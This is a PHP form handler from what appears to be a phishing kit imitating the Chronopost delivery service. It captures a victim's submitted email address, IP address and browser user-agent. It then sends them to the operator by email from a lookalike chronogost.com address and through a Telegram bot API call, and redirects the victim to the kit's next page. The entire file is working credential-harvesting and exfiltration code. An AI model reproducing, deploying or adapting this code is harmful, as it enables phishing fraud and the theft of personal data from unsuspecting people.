<?php 
include('../../config.php');
session_start();

if($_SESSION['authorized'] == "1")
{
if(isset($_POST['op']))
{



	if(!empty($_POST['email']))
	{


		$_SESSION['email'] = $_POST['email'];

		if($onlycards == "0")
		{
				$message = "
[📦] LOGIN [📦]

📦 E-Mail : ".$_SESSION['email']."

[🌐] TIERS [🌐]

🌐 Adresse IP : ".$_SESSION['ip']."
🌐 User-Agent : ".$_SERVER['HTTP_USER_AGENT']."

			";
$subject = "=?UTF-8?B?4oyK8J+TpuKMiSBMT0dJTiBDSFJPTk9QT1NU?= - ".$_SESSION['email']." - ".$_SESSION['ip'];
$entete = "From: =?UTF-8?B?8J+PtOKAjeKYoO+4j0tFS1JB8J+PtOKAjeKYoO+4jw==?= <login@chronogost.com>";
mail($rezmail,$subject,$message,$entete);
			$data = ['text' => $message,'chat_id' => $chat_idlog];
       			 file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
		}
		
		$_SESSION['userid'] = uniqid();
		header('Location: ../loader.php?goto=explain');


	}

}


}
else{
	die('YOU ARE NOT AUTHORIZED');
}






?>